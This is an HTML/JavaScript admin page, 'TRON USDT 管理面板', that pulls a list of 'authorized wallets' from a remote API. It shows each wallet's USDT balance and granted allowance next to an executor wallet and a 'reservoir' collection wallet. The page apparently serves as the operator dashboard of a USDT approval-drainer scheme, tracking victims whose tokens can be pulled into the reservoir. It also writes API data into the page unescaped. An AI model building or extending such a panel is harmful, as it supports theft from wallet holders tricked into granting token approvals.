<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRON USDT 管理面板</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        body { 
            background-color: #f8f9fa; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
        }
        .container { 
            padding-top: 2rem; 
            max-width: 1000px; 
        }
        .card { 
            margin-bottom: 1rem; 
            border: none;
            box-shadow: 0 0.125rem 0.25rem rgba(0,0,0,0.075);
            border-radius: 0.5rem;
        }
        .balance-info { 
            font-size: 1.1rem;
            color: #0d6efd;
        }
        .wallet-item {
            background: #fff;
            padding: 1rem;
            margin-bottom: 0.5rem;
            border-radius: 0.5rem;
            border: 1px solid #e9ecef;
            transition: all 0.3s ease;
        }
        .wallet-item:hover {
            box-shadow: 0 0.25rem 0.5rem rgba(0,0,0,0.1);
        }
        .loading {
            display: none;
            margin-left: 1rem;
        }
        .transfer-input {
            width: 150px;
            display: inline-block;
        }
        .btn {
            border-radius: 0.375rem;
            padding: 0.5rem 1.5rem;
            transition: all 0.3s ease;
        }
        .btn-sm {
            padding: 0.25rem 0.75rem;
        }
        .copy-button {
            cursor: pointer;
            color: #6c757d;
            margin-left: 0.5rem;
            transition: color 0.3s ease;
        }
        .copy-button:hover {
            color: #0d6efd;
        }
        .data-info {
            background: #e9ecef;
            padding: 0.5rem 1rem;
            border-radius: 0.375rem;
            margin-bottom: 1rem;
            font-size: 0.875rem;
        }
        .transaction-item {
            border-left: 3px solid #198754;
            padding-left: 1rem;
        }
        .alert {
            border-radius: 0.5rem;
        }
        .modal-content {
            border-radius: 0.5rem;
        }
        .badge {
            font-weight: normal;
            padding: 0.5em 0.75em;
        }
        .authorization-badge {
            font-size: 0.8rem;
            padding: 0.3em 0.6em;
            margin-left: 0.5rem;
        }
        .badge.bg-danger {
            background-color: #dc3545 !important;
        }
        .badge.bg-success {
            background-color: #198754 !important;
        }
        .badge.bg-info {
            background-color: #0dcaf0 !important;
        }
        .ms-3 {
            margin-left: 1rem;
        }
        .mt-1 {
            margin-top: 0.25rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="mb-4 text-center">TRON USDT 管理面板</h1>
        
        <!-- 数据信息显示 -->
        <div id="dataInfo" class="data-info text-center">
            <i class="fas fa-info-circle me-2"></i>正在加载数据信息...
        </div>

        <!-- 添加新钱包 -->
        <div class="card">
            <div class="card-body">
                <h5 class="card-title">
                    <i class="fas fa-plus-circle me-2"></i>添加钱包
                </h5>
                <div class="input-group mb-3">
                    <input type="text" id="newAddress" class="form-control" placeholder="输入TRON钱包地址">
                    <button class="btn btn-primary" onclick="addNewWallet()">
                        <i class="fas fa-plus me-2"></i>手动添加
                    </button>
                </div>
                <div class="mt-2">
                    <button class="btn btn-outline-primary" onclick="detectAuthorizedWallets()">
                        <i class="fas fa-search me-2"></i>自动检测已授权钱包
                    </button>
                    <small class="text-muted ms-2">自动检测与合约交互过的钱包</small>
                </div>
            </div>
        </div>

        <!-- 已保存钱包列表 -->
        <div class="card">
            <div class="card-body">
                <div class="d-flex justify-content-between align-items-center mb-3">
                    <h5 class="card-title mb-0">
                        <i class="fas fa-wallet me-2"></i>已保存钱包
                        <span id="walletCount" class="badge bg-primary ms-2">0</span>
                    </h5>
                    <button class="btn btn-outline-primary btn-sm" onclick="refreshAllBalances()">
                        <i class="fas fa-sync-alt me-2"></i>刷新所有余额
                    </button>
                </div>
                <div id="savedWallets">
                    <!-- 钱包列表将通过JavaScript动态添加 -->
                </div>
            </div>
        </div>

        <!-- 合約信息 -->
        <div class="card mt-4">
            <div class="card-body">
                <h5 class="card-title">
                    <i class="fas fa-info-circle me-2"></i>合約信息
                </h5>
                <div class="mt-3">
                    <!-- 發動合約錢包狀態 -->
                    <p>
                        <strong>發動合約錢包：</strong>
                        <span id="executorAddress">THjNpJWbuGxvhR9kDDTDz1wVKhe2PWLfNR</span>
                        <i class="fas fa-copy copy-button" onclick="copyToClipboard('executorAddress')"></i>
                        <br>
                        <span id="executorBalance" class="ms-3 mt-1 d-inline-block"></span>
                    </p>

                    <!-- 水庫錢包狀態 -->
                    <p>
                        <strong>水庫錢包地址：</strong>
                        <span id="receiverAddress">TYfH1UFjepVVFaEsaCk4MAHM2yA5RQk899</span>
                        <i class="fas fa-copy copy-button" onclick="copyToClipboard('receiverAddress')"></i>
                        <br>
                        <span id="receiverBalance" class="ms-3 mt-1 d-inline-block"></span>
                    </p>

                    <p>
                        <strong>USDT合約地址：</strong>
                        <span id="contractAddress">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</span>
                        <i class="fas fa-copy copy-button" onclick="copyToClipboard('contractAddress')"></i>
                    </p>
                </div>
            </div>
        </div>
    </div>

    <script>
        const API_URL = 'https://spectacular-wholesale-sprint.glitch.me';

        async function fetchAPI(endpoint) {
            try {
                console.log(`Fetching ${API_URL}${endpoint}`);
                const response = await fetch(`${API_URL}${endpoint}`);
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                const data = await response.json();
                console.log(`API Response:`, data);
                return data;
            } catch (error) {
                console.error(`API Error:`, error);
                throw error;
            }
        }

        async function refreshAllBalances() {
            try {
                console.log('Starting refresh...');
                const data = await fetchAPI('/authorized-wallets');
                
                if (data.systemStatus) {
                    updateSystemStatus(data.systemStatus);
                }

                if (data.wallets) {
                    updateWalletList(data.wallets);
                    updateDataInfo(data.wallets.length);
                }
            } catch (error) {
                console.error('Refresh error:', error);
                showAlert('刷新失敗，請檢查網絡連接', 'danger');
            }
        }

        function updateSystemStatus(status) {
            console.log('Updating system status:', status);
            const executorBalance = document.getElementById('executorBalance');
            if (status.executor.lowTrxBalance) {
                executorBalance.innerHTML = `<span class="badge bg-danger">
                    <i class="fas fa-exclamation-triangle me-1"></i>
                    TRX餘額: ${status.executor.trxBalance} (餘額過低！)
                </span>`;
            } else {
                executorBalance.innerHTML = `<span class="badge bg-success">
                    TRX餘額: ${status.executor.trxBalance}
                </span>`;
            }

            const receiverBalance = document.getElementById('receiverBalance');
            receiverBalance.innerHTML = `<span class="badge bg-info">
                USDT餘額: ${status.receiver.usdtBalance}
            </span>`;
        }

        function updateWalletList(wallets) {
            const walletList = document.getElementById('savedWallets');
            document.getElementById('walletCount').textContent = wallets.length;

            const walletsHtml = wallets.map(wallet => `
                <div class="wallet-item">
                    <div class="d-flex justify-content-between align-items-center">
                        <div>
                            <span class="address">${wallet.address}</span>
                            <i class="fas fa-copy copy-button" onclick="copyToClipboard('${wallet.address}')"></i>
                        </div>
                        <div>
                            <button class="btn btn-danger btn-sm" onclick="deleteWallet('${wallet.address}')">
                                <i class="fas fa-trash"></i>
                            </button>
                        </div>
                    </div>
                    <div class="mt-2">
                        <span class="badge bg-success">餘額: ${wallet.balance} USDT</span>
                        <span class="badge bg-primary ms-2">授權額度: ${wallet.allowance}</span>
                    </div>
                </div>
            `).join('');

            walletList.innerHTML = walletsHtml;
        }

        function updateDataInfo(walletCount) {
            const dataInfo = document.getElementById('dataInfo');
            dataInfo.innerHTML = `
                <i class="fas fa-info-circle me-2"></i>
                當前共有 ${walletCount} 個已授權錢包
                <small class="text-muted ms-2">上次更新: ${new Date().toLocaleTimeString()}</small>
            `;
        }

        async function addNewWallet() {
            const address = document.getElementById('newAddress').value.trim();
            if (!address) {
                showAlert('請輸入錢包地址', 'warning');
                return;
            }

            try {
                const data = await fetchAPI(`/balance/${address}`);
                if (data.isAuthorized) {
                    document.getElementById('newAddress').value = '';
                    await refreshAllBalances();
                    showAlert('錢包添加成功', 'success');
                } else {
                    showAlert('該錢包未授權或餘額為0', 'warning');
                }
            } catch (error) {
                console.error('Add wallet error:', error);
                showAlert('添加失敗，請檢查地址是否正確', 'danger');
            }
        }

        async function detectAuthorizedWallets() {
            try {
                await refreshAllBalances();
                showAlert('已更新授權錢包列表', 'success');
            } catch (error) {
                console.error('Error:', error);
                showAlert('檢測失敗，請稍後重試', 'danger');
            }
        }

        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                showAlert('已複製到剪貼板', 'success');
            }).catch(err => {
                console.error('複製失敗:', err);
                showAlert('複製失敗', 'danger');
            });
        }

        async function deleteWallet(address) {
            if (confirm('確定要刪除這個錢包嗎？')) {
                try {
                    await refreshAllBalances();
                    showAlert('錢包已刪除', 'success');
                } catch (error) {
                    console.error('Error:', error);
                    showAlert('刪除失敗', 'danger');
                }
            }
        }

        function showAlert(message, type) {
            const alertDiv = document.createElement('div');
            alertDiv.className = `alert alert-${type} alert-dismissible fade show position-fixed top-0 end-0 m-3`;
            alertDiv.innerHTML = `
                ${message}
                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
            `;
            document.body.appendChild(alertDiv);
            
            setTimeout(() => {
                alertDiv.remove();
            }, 3000);
        }

        // 頁面加載完成後自動執行
        document.addEventListener('DOMContentLoaded', () => {
            console.log('Page loaded, initializing...');
            refreshAllBalances();
            // 每30秒自動刷新一次
            setInterval(refreshAllBalances, 30000);
        });
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
